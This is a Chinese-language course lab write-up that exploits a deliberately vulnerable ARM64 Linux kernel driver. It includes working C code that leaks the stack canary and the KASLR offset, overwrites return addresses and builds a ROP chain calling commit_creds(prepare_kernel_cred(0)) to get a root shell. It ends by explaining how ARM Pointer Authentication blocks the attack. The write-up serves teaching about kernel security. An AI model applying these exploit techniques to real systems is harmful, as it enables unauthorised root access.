
## 1 代码分析
首先来分析一下代码`drivers/misc/bofdriver.c`。根据实验指导的提示，`zjubof_init()`里面注册了驱动，调用了`zjubof_ops`，其中我们可以获知，用户对该 driver 调用`read`和`write`时，会分别调用到`zjubof_read()`和`zjubof_write()`。我们仔细看一下这些函数做了什么：
```c
#define CMD_LIMIT   201
char command[CMD_LIMIT];
// ...
static ssize_t zjubof_write(struct file *file, const char __user *buffer, size_t len, loff_t *offset)
{
    if(copy_from_user(command, buffer, len)) 
        return -EFAULT;
    zjubof_write2(command, len);
    return 0;
}
```
`zjubof_write()`使用`copy_from_user()`从用户态指针`buffer`那里拿了`len`个字节的数据，放在了`command`里面；这里`char command[CMD_LIMIT]`是一个全局变量，其中`CMD_LIMIT`是`201`。<br />然后又调用了 `zjubof_write2()`：
```c
struct cmd_struct {
    char    command[16];
    size_t  length;
};
// ...
ssize_t zjubof_write2(char *buffer, size_t len)
{   
    volatile struct cmd_struct cmd[20];
    memset((void*)cmd, 'A', sizeof(cmd)); 
    printk("zjubof_write2 %lx\n", cmd[0].length);
    zjubof_write3(buffer, len);
    return 0;
}
```
其实没太看明白这里发生了什么，除了调用了 `zjubuf_write3()`；所以继续看下去：
```c
#define CMD_LENGTH  49
char prev_cmd[CMD_LENGTH];
//...
ssize_t zjubof_write3(char *buffer,size_t len)
{
    printk("zjubof_write3\n");
    zjubof_write4(buffer, len);
    return 0;
}

ssize_t zjubof_write4(char *buffer,size_t len)
{
    struct cmd_struct cmd;   
    printk("zjubof_write4\n");
    memset(cmd.command, 0, 16);
    cmd.length = len;
    if(cmd.length > 16)
        cmd.length = 16;
    memcpy(cmd.command, buffer, len);
    memcpy(prev_cmd, cmd.command, cmd.length);
    printk("cmd :%s len:%ld\n", cmd.command,len);
    return 0;
}
```
`zjubof_write3()`更是什么都没有发生，只是调用了`zjubof_write4()`。<br />`zjubof_write4()`看起来就比较草率了：它定义了一个`cmd_struct cmd`，将`buffer`指向的`len`个字节的内容放到`cmd.command`指向的内存里；然后又把`command[]`里的`cmd.length`个字节放到`prev_cmd`里；这里 `char prev_cmd[CMD_LENGTH]`也是一个全局变量，`CMD_LENGTH`是`49`。

再来看看`zjubof_read()`：
```c
static ssize_t zjubof_read(struct file *file, char __user *buffer, size_t len, loff_t *offset)
{
    int ret = 0;
    if(len >= CMD_LENGTH)
        return -EINVAL;
    ret = copy_to_user(buffer, prev_cmd, len);
    return ret;
}
```
	这个函数限制了`len`不能大于等于`CMD_LENGTH`，即`49`个字节，否则返回一个错误代码；其效果是，将内核空间的指针`prev_cmd`指向的`len`字节内容复制到用户态指针`buffer`指向的内存中去，如果数据拷贝成功，则返回零；否则，返回没有拷贝成功的数据字节数。

## 2 Task 1: 绕过 stack canary 和 KASLR
首先从之前的分析可以得知，我们通过`read()`至多只能获取 48 个字节的内容；但是从`zjubof_write4()`中可以看出，如果我们在填入`cmd.command`时篡改`cmd.length`，那么我们就可以在后面填入`prev_cmd`时额外读取一些信息，形成 overread。

分析得知，我们以此法能看到的 48 个字节是：
![image.png](./assets/1651560151955-93adacfd-24c2-4511-b63f-458c6f9e3da1.png)
其要求是，`cmd.length`字段应当是`48`。

我们构造如下的 payload 实现 overread：
![image.png](./assets/1651551111149-5b4de543-73fa-4d53-a86c-9c03a6860ca4.png)
`len`设为`17`或者`24`。<br />（这里的输出是我另写的便于阅读的函数，绿色用来表示 write 的 buffer，青色用来表示 read 出来的结果）

运行两次，可以得到以下结果：
![image.png](./assets/1651517299355-4cd4d8dd-143f-459d-a882-5772e941c584.png)
可以看到，我们已经读到了一些额外的信息：`canary`每次都会变化，而`x29`和`x30`在同一次 qemu 启动时保持不变。

另一次启动时，我们可以看到，`x29`和`x30`在每次启动后也会发生变化：
![image.png](./assets/1651519015419-b136cfd8-ad53-4aa7-8b4e-f9201051cc42.png)

因此，根据之前对栈的分析，我们可以获取到`canary`和`x30`的值了（这里的观察是关闭了 KASLR 的情况下看到的）：
![image.png](./assets/1651560237527-aac5f644-c964-4b30-8115-17b873c24b3c.png)
使用 gdb 调试，可以看到，这里的`x30`的值事实上就是`zjubof_write2()`里面跳转指令`bl`的下一条指令的地址：
![image.png](./assets/1651560324484-8c525d2b-7047-41c9-b325-9fb549c44b1a.png)
（`bl <addr>`指令将 PC + 4 写入`x30`，然后跳转到`<addr>`）<br />因此，我们在实际运行时只需要计算获得的`x30`的值与`0xffff800010de7d0c`的差值，就可以得知当前 KASLR 提供的偏移了；即：
![image.png](./assets/1651561412529-42becf03-ab0c-4ffd-ac8d-38e5009ce9ce.png)
至此，我们可以绕过 canary 和 KASLR 了！

这一部分使用的代码如下；删除了所有调试输出的代码，完整代码见附录：
```c
static const u64 retAddrWithoutKASLR = 0xffff800010de7d0c;

char canary[8], oldRetAddr[8], oldFp[8], offset[8];

void getCanaryAndOffset(int fd) {
    int len = 0;
    char buf[50] = "0123456789012345\x30";
    
    len = write(fd, buf, 17); 
    len = read(fd, buf, 48); 
    
    copyByte(buf + 24, canary);
    copyByte(buf + 32, oldFp);
    copyByte(buf + 40, oldRetAddr);
    
    *(u64 *)offset = *(u64 *)oldRetAddr - retAddrWithoutKASLR;
}
```

## 3 Task 2: 修改 return address，获取 root 权限
Task 2 要求我们跳转到 `first_level_gadget()`，看一下这段代码：
```c
void first_level_gadget(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm volatile (                  \
                  "mov     x0, #0x0\n" \
                  "ldp     x29, x30, [sp] \n" \
                  "ldp     x19, x20, [sp, #16]\n" \
                  "ldr     x21, [sp, #32]\n" \
                  "add     sp, sp, #0x220 \n" \
                  "ret\n"  \
                 );
}
```
它首先用`commit_creds(prepare_kernel_cred(0));`提权，然后从栈上取了`fp`和`retAddr`，将`sp`增加了`0x220`并返回。<br />这些事情的目的是什么呢？<br />我们在`write4()`中篡改了`write3()`的返回地址后，从`write3()`返回到`first_level_gadget()`的某个地方；为了后面操作的正常进行，我们希望它能够正常返回；但是这时返回到`write2()`的地址已经被我们覆盖掉了，所以我们只能让它返回到`write1()`。恰好，在从`write3()`返回的时候`sp`会指向`write2()`的活动记录的最下面，因此这时候直接用`ldp`读到的就是返回`write1()`的正确地址和`fp`：
![image.png](./assets/1651568661907-8d24cf0a-73b7-472f-9903-e9ddea619fc5.png)
那么`sp += 0x220`是干什么呢？实际上就是因为，我们需要手动将`write2()`的活动记录回收掉；调试可以得知这个大小就是`write2()`活动记录的大小。

我们看一下对应的汇编代码：
![image.png](./assets/1651567629729-bf79e062-9e26-47b2-8f68-536ce828483d.png)
需要注意的是，我们不能够让这里第一行的操作修改掉`sp`。因此我们不能直接跳到第一行，而是跳到第二行或者第三行开始运行。

因此，我们的 payload 设计如下：
```c
static const u64 firstLevelGadgetTarget = 0xffff8000107abd80;

void goToFirstLevelGadget(int fd) {
    char buf[50] = "0123456789012345\x30";
    
    copyByte(canary, buf + 24);
    copyByte(oldFp, buf + 32);
    u64 target = firstLevelGadgetTarget + *(u64 *)offset;
    copyByte((char *)&target, buf + 40);
    
    write(fd, buf, 48); 
    read(fd, buf, 48); 
   
    system("/bin/sh");
}
```
即，我们将`canary`和`oldFp`原样写入，然后根据`offset`和第三行的地址`0xffff8000107abd80`计算出`target`覆盖掉`ret addr`，然后调用`write`进行写入。

尝试编译运行，可以看到，我们成功获取了 root 权限，并获取了 flag：
![image.png](./assets/1651565872873-5f3fb698-be3f-4a8d-a00a-ab751cda3a25.png)

## 4 Task 3: ROP 获取 root 权限
Task 3 要求我们通过 `-> prepare_kernel_cred() -> commit_creds() -> second_level_gadget() -> zjubof_write()`的路径获取 root 权限并正常返回。从之前的分析我们可以得知，这一串返回是从 `write3()`开始的。

我们依次观察各个函数返回时`sp`的变化：

- `write3()`返回时，`sp`会增加 32：

![image.png](./assets/1651629282002-f5e897e4-8aa0-49ed-bd39-799ce23da065.png)

- `prepare_kernel_cred()`（后面可能简写为`p_k_c`或`PKC`）返回时，`sp`会增加 32：

![image.png](./assets/1651629501723-c3d2475a-37d0-49db-9ab3-ddf222fcf8df.png)

- `commit_creds()`（后面可能简写为`c_c`或`CC`）返回时，`sp`会增加 48：

![image.png](./assets/1651629700954-d112b878-59aa-424c-84cb-7789aa6af6b3.png)

- `second_level_gadget()`（后面可能简写为`s_l_g`或`SLG`）返回时，`sp`会增加 464；我们暂且假设它是善良的实验设计者帮我们算好的 😍：

![image.png](./assets/1651629921313-ada165c0-fcbb-4192-a11f-a173140fbfaf.png)

据此，我们可以设计出我们 payload 的结构：
![image.png](./assets/1651631009808-c32d4a49-c23e-4143-ad08-4c0d38bec372.png)
这里面标明了每次返回之后`sp`的位置，以及对应地被使用到的返回地址。其中灰色的字段表示并不重要，我们将黑色的对应填上就好了！

下面我们研究每个返回地址应该取多少。如同我们在第 3 节中讨论过的，对于正常的函数，由于它们在第一行会修改`sp`，并且导致我们精心构造的返回地址被覆盖掉，因此我们需要跳过第一行，从第二行直接开始执行。<br />我们查看各次跳转的 target 地址：

- `p_k_c()`应当返回在第二句的地址，即`0xffff8000100a6214`：

![image.png](./assets/1651571240724-8b5f6098-a60b-476e-907d-c8cf2416ecb5.png)

- `c_c()`应当返回在第二句的地址，即`0xffff8000100a5f6c`：

![image.png](./assets/1651571319892-b9bf7488-e9f2-425d-a639-0446d7320183.png)

- `s_l_g()`非常友好，刚开始没有改`sp`，所以直接跳到开头`0xffff8000107abdb0`就好：

![image.png](./assets/1651571268207-b99f2ca2-a116-434f-808f-a36c905c80a1.png)

- `zjubof_write()`应当返回在调用`zjubof_write2()`的后一行，即 `0xffff8000107abe54`：

![image.png](./assets/1651630284270-4c7c9252-c692-4de9-9008-e82475f2fbb6.png)

也就是说，我们构造了这样的 payload：<br />（实际上，这时候只是做一个尝试，因为我们并不知道`s_l_g()`是否刚好帮我们把`sp`放到了正确的位置，如果没有的话可能还需要再调整）
```c
static const u64 writeTarget = 0xffff8000107abe54;
static const u64 SLGTarget = 0xffff8000107abdb0;
static const u64 CCTarget = 0xffff8000100a5f6c;
static const u64 PKCTarget = 0xffff8000100a6214;

void multiROP(int fd) {
    char buf[200] = "A";
    
    copyByte(canary, buf + 24);
    
    u64 target = PKCTarget + *(u64 *)offset;
    copyByte((char *)&target, buf + 40);
    
    target = CCTarget + *(u64 *)offset;
    copyByte((char *)&target, buf + 72);
    
    target = SLGTarget + *(u64 *)offset;
    copyByte((char *)&target, buf + 104);
    
    target = writeTarget + *(u64 *)offset;
    copyByte((char *)&target, buf + 152);
    
    write(fd, buf, 160); 
   
    system("/bin/sh");
}
```

运行一下试试，成功了！说明实验设计者非常善良，直接帮我们调整好了`sp`🤣：
![image.png](./assets/1651631096489-e6d6592c-288b-42f6-8df9-9bb87f5be09e.png)

## 5 Task 4: Linux 内核对 ROP 攻击的防护

### 5.1 艰难的编译和运行
用下面的指令编译：
```bash
export ARCH=arm64
make CROSS_COMPILE=aarch64-linux-gnu- defconfig
make CROSS_COMPILE=aarch64-linux-gnu- menuconfig
make CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc)
```
默认已经开启 PA，所以到配置的时候直接退出就好。

编译后把`start.sh`中的`-kernel ./Image`改成`-kernel ./vmlinux`尝试运行，发现跑不起来：<br />![WDAK459SVFWAIG(S[FGTSF5.png](./assets/1651636025711-3538311d-4f1d-4819-acd2-9f6ad443bf23.png)
于是尝试把 vmlinux 精简成 Image：`objcopy -O binary vmlinux Image --strip-all`<br />出现报错：`Unable to recognise the format of the input file 'vmlinux'`<br />问了同学，同学说要用 `aarch64-linux-gnu-objcopy`<br />然后终于能跑了））

### 5.2 研究防护机制
尝试发现，两种 ROP 都会导致段错误：
![image.png](./assets/1651636813427-76c35ace-e3a3-4113-b5fb-b8363357628a.png)
跟踪调试一下找找问题：
![image.png](./assets/1651637358406-49a3c86b-3961-41e4-ae75-a0e12192a29f.png)
跟踪后发现，这里出现了一个`autiasp`指令，然后再`ret`的时候就跑到了奇怪的地方：
![image.png](./assets/1651637371103-6f63933f-66dc-42e6-8b95-d4f303b8c945.png)
再继续运行就会出现段错误：
![image.png](./assets/1651637475929-e3ea550d-56ca-4edb-8225-2b316ccbf1d3.png)
看一下`zjubof_write3()`的汇编：
![image.png](./assets/1651637757748-da41ee14-0686-4cb6-bacb-e39c577af551.png)
发现其实就是多了`paciasp`和`autiasp`这两个指令。

查询资料以及观看 [USENIX Security '19 - PAC it up: Towards Pointer Integrity using ARM Pointer Authentication](https://www.youtube.com/watch?v=UD1KKHyPnZ4) 得知，这种防护机制叫做  ARM Pointer Authentication；`paciasp`的全称是 Pointer Authentication Code for Instruction address, using key `A` with modifier`SP`，`autiasp`的全称是 Authenticate Instruction address, using key `A` with modifier`SP`。根据定义，这两个操作都是对 `x30`，也就是存入栈上 / 从栈上取出的返回地址做的。<br />这种防护机制考虑到 AArch64 中的指针存在一些未被使用的字段：
![image.png](./assets/1651639069015-90e1b81f-0c3e-4e0f-a33f-aacefb7497c7.png)
因此它将该 Pointer 以及一个 64 位的 modifier（在`paciasp`和`autiasp`中就是`sp`，因为进入和退出函数的时候`sp`恰好相等）、一个 128 位的密钥（运行时生成的），以某种不在指令中说明的、有可能是 implementation defined 的算法生成 PAC, Pointer Authentication Code：
![image.png](./assets/1651639287994-033105f8-9e58-417b-ab86-9661670d89f1.png)
并将其嵌入在指针未被使用的字段中：
![image.png](./assets/1651639326622-dd65d0c4-fe44-47a6-b886-670349d2b706.png)
或者：
![image.png](./assets/1651639344211-ee2b6193-9105-4a61-9d35-6d39e7816814.png)
使用哪一种与 tag 是否启用有关。<br />也就是说，在进入这个函数的时候，栈上存储的不再直接是返回地址，而是附带着加密信息的返回地址，退出时程序校验这个地址信息的有效性，如果有效才正常返回；而由于攻击者无法得知`key`以及加密算法，因此攻击者无法构造出一个附带合理加密信息的到任意地方的返回地址，因此无法进行 ROP 攻击。<br />这一防护机制也可以应用在数据指针上。

### References

1. [https://lwn.net/Articles/718888/](https://lwn.net/Articles/718888/)
2. [https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf](https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf)
3. [https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ](https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ)

## Notes

- 安装 gef：
   - `git clone [https://github.com/hugsy/gef.git](https://github.com/hugsy/gef.git) ~/GdbPlugins`
   - `echo "source ~/GdbPlugins/gef.py" > ~/.gdbinit`
- 运行`debug.sh`失败是因为没给`x`权限
   - `chmod a+x debug.sh`

